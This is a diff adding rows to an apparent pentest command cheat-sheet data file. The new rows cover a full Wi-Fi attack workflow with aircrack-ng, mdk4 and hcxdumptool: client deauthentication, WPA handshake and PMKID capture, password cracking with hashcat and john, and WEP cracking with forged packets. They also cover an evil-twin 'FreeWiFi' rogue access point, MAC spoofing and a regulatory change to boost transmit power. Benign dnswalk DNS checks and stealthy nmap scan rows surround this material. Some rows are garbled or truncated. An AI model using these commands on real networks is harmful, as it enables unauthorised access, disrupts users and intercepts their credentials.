@@ -184,3 +184,85 @@ Nmap (-sS -T0) | nmap -sS -T0 -f --data-length 64 --scan-delay 10s <Target_IP> |
 Nmap (-sS -iL) | nmap -sS --randomize-hosts -iL targets.txt -T2 --max-retries 1 | Don't scan sequentially, don't retry aggressively, look more like organic network traffic.
 Filtered | Nmap can't determine if the port is open because packet filtering (firewall, IPS, router ACL) is preventing probes from reaching it. You're not getting responses—you're getting silence. | Filtered
 Open-Filtered | Nmap can't tell if the port is open or filtered. | Open-Filtered
+
+Kali/Debian | sudo apt install aircrack-ng | Kali/Debian
+macOS | brew install aircrack-ng | macOS
+Kill interfering processes | sudo airmon-ng check kill | Kill interfering processes
+Start monitor mode | sudo airmon-ng start wlan0 | Start monitor mode
+Stop monitor mode | sudo airmon-ng stop wlan0mon | Stop monitor mode
+Manual monitor mode | sudo ip link set wlan0 down | Manual monitor mode
+MONITOR MODE# | sudo iw dev wlan0 set type monitor | MONITOR MODE#
+MONITOR MODE# | sudo ip link set wlan0 up | MONITOR MODE#
+Scan all channels | sudo airodump-ng wlan0mon | Scan all channels
+Scan specific channel | sudo airodump-ng wlan0mon -c 6 | Scan specific channel
+Scan specific band | sudo airodump-ng wlan0mon --band a | Scan specific band
+2.4GHz | sudo airodump-ng wlan0mon --band bg | 2.4GHz
+All bands | sudo airodump-ng wlan0mon --band abg | All bands
+Filter by BSSID | sudo airodump-ng wlan0mon --bssid <MAC_Address> | Filter by BSSID
+Filter by ESSID | sudo airodump-ng wlan0mon --essid "TargetNetwork" | Filter by ESSID
+Write output | sudo airodump-ng wlan0mon -w capture --output-format pcap | Write output
+SCANNING / RECON# | sudo airodump-ng wlan0mon -w capture --output-format csv,pcap | SCANNING / RECON#
+Focus on target AP | sudo airodump-ng wlan0mon -c 6 --bssid <MAC_Address> -w capture | Focus on target AP
+WPA/WPA2 HANDSHAKE CAPTURE# | sudo airodump-ng wlan0mon -c CHANNEL --bssid AP_BSSID -w handshake | 1. Start capture on target channel
+WPA/WPA2 HANDSHAKE CAPTURE# | sudo aireplay-ng -0 5 -a AP_BSSID -c CLIENT_MAC wlan0mon | 2. Deauthenticate client (force reconnection)
+Deauth all clients | sudo aireplay-ng -0 10 -a AP_BSSID wlan0mon | Deauth all clients
+Dictionary attack | sudo aircrack-ng handshake-01.cap -w <File_Path> | Dictionary attack
+Specify target BSSID | sudo aircrack-ng handshake-01.cap -b AP_BSSID -w wordlist.txt | Specify target BSSID
+Use multiple wordlists | sudo aircrack-ng handshake-01.cap -w list1.txt,list2.txt,list3.txt | Use multiple wordlists
+Convert to hashcat format | aircrack-ng handshake-01.cap -j hashcat_file | Convert to hashcat format
+Or use hcxpcapngtool | hcxpcapngtool -o hash.22000 handshake-01.cap | Or use hcxpcapngtool
+CRACKING WPA/WPA2# | hashcat -m 22000 hash.22000 rockyou.txt | Crack with hashcat (much faster with GPU)
+Crack with john | aircrack-ng handshake-01.cap -J john_hash | Crack with john
+CRACKING WPA/WPA2# | john --wordlist=rockyou.txt john_hash.hccap | CRACKING WPA/WPA2#
+1. Start capture | sudo airodump-ng wlan0mon -c CHANNEL --bssid AP_BSSID -w wep_capture | 1. Start capture
+2. Generate traffic (ARP replay) | sudo aireplay-ng -3 -b AP_BSSID -h YOUR_MAC wlan0mon | 2. Generate traffic (ARP replay)
+WEP CRACKING# | sudo aireplay-ng -1 0 -a AP_BSSID -h YOUR_MAC wlan0mon | 3. Fake authentication (if no clients)
+4. Crack (need ~40,000+ IVs) | sudo aircrack-ng wep_capture-01.cap | 4. Crack (need ~40,000+ IVs)
+Deauth specific client | sudo aireplay-ng -0 10 -a AP_BSSID -c CLIENT_MAC wlan0mon | Deauth specific client
+Deauth all clients on AP | sudo aireplay-ng -0 0 -a AP_BSSID wlan0mon | Deauth all clients on AP
+DEAUTHENTICATION ATTACKS# | sudo mdk4 wlan0mon d -B AP_BSSID | Deauth with mdk3/mdk4 (more powerful)
+Deauth all | sudo mdk4 wlan0mon d | Deauth all
+Using hcxdumptool | sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --filterlist_ap=AP_BSSID --filtermode=2 --enable_status=1 | Using hcxdumptool
+Convert to hashcat format | hcxpcapngtool -o pmkid.22000 pmkid.pcapng | Convert to hashcat format
+Crack | hashcat -m 22000 pmkid.22000 rockyou.txt | Crack
+Test injection capability | sudo aireplay-ng -9 wlan0mon | Test injection capability
+Against specific AP | sudo aireplay-ng -9 -a AP_BSSID wlan0mon | Against specific AP
+Chopchop attack (WEP) | sudo aireplay-ng -4 -b AP_BSSID wlan0mon | Chopchop attack (WEP)
+Fragmentation attack (WEP) | sudo aireplay-ng -5 -b AP_BSSID wlan0mon | Fragmentation attack (WEP)
+Forge ARP request | sudo packetforge-ng -0 -a AP_BSSID -h YOUR_MAC -k <Target_IP> -l <Target_IP> -y fragment.xor -w forged.cap | Forge ARP request
+TOOL SUITE# | airmon-ng         Monitor mode management | TOOL SUITE#
+TOOL SUITE# | airodump-ng       Packet capture and AP scanning | TOOL SUITE#
+TOOL SUITE# | aireplay-ng       Packet injection and deauth | TOOL SUITE#
+TOOL SUITE# | aircrack-ng       WEP/WPA key cracking | TOOL SUITE#
+TOOL SUITE# | airbase-ng        Rogue AP / evil twin | TOOL SUITE#
+TOOL SUITE# | packetforge-ng    Forge encrypted packets | TOOL SUITE#
+Create fake AP | sudo airbase-ng -a AP_BSSID --essid "FreeWiFi" -c 6 wlan0mon | Create fake AP
+EVIL TWIN (ROGUE AP)# | sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon | With forwarding (bridge to internet)
+Check interface capabilities | iw list | grep -A 10 "Supported interface modes"
+Set TX power | sudo iw reg set BO | Set TX power
+Set power (if supported) | sudo iwconfig wlan0 txpower 30 | Set power (if supported)
+Random MAC | sudo macchanger -r wlan0 | Random MAC
+TIPS# | monitor mode | TIPS#
+TIPS# | deauth needed | TIPS#
+TIPS# | by WIDS/WIPS | TIPS#
+TIPS# | before testing | TIPS#
+TIPS# | essentially broken; | TIPS#
+
+Check DNS zone | dnswalk <domain>. | Check DNS zone (trailing dot required)
+Recursive check of subdomains | dnswalk -r <domain>. | Recursive check of subdomains
+Force zone transfer | dnswalk -f <domain>. | Force zone transfer (no check for SOA)
+warning for duplicate A records | dnswalk -a <domain>. | Turn on warning for duplicate A records
+Debug mode (print DNS queries) | dnswalk -d <domain>. | Debug mode (print DNS queries)
+suppress check for invalid characters | dnswalk -i <domain>. | Suppress check for invalid characters
+Check lame delegations | dnswalk -l <domain>. | Check lame delegations
+heck for missing reverse (PTR) records | dnswalk -m <domain>. | Check for missing reverse (PTR) records
+Basic zone check | dnswalk <Domain_Name>. | Basic zone check
+Recursive check with all warnings | dnswalk -r -a -l -m <Domain_Name>. | Recursive check with all warnings
+Debug mode to see all queries | dnswalk -d <Domain_Name>. | Debug mode to see all queries
+Strict checking mode | dnswalk -F <Domain_Name>. | Strict checking mode
+Check with lame delegation detection | dnswalk -l <Domain_Name>. | Check with lame delegation detection
+Recursive check with all warnings | dnswalk -r -a -l -m <Domain_Name> | dnswalk -r -a -l -m <Domain_Name>
+Demo Recursive check | dnswalk -r -a -l -m example.com | Demo Recursive check with all warnings
+Demo Debug mode | dnswalk -d example.com | Debug mode to see all queries
+Demo Strict checking mode | dnswalk -F example.com | Demo Strict checking mode
+Demo lame delegation detection | dnswalk -l example.com | Check with lame delegation detection
